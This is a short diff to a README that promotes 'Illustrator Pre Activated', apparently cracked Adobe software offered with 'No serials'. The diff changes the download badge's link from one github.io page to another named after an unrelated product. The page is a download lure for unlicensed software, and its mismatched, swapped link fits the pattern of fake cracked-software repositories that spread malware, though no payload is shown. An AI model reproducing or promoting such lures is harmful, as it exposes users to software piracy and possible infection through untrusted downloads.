@@ -2,7 +2,7 @@
 
 Skip activation hassles and jump right into your creative workflow with **Illustrator Pre Activated**. No serials. No delays. Just pure design freedom.
 
-[![⬇️ Download Illustrator Pre Activated](https://img.shields.io/badge/⬇️_Download_Illustrator_Pre_Activated-blue?style=for-the-badge&logo=adobe)](https://illustrator-pre-activated-cc.github.io/.github)
+[![⬇️ Download Illustrator Pre Activated](https://img.shields.io/badge/⬇️_Download_Illustrator_Pre_Activated-blue?style=for-the-badge&logo=adobe)](https://3dcoat-download.github.io/.github)
 
 ---
 
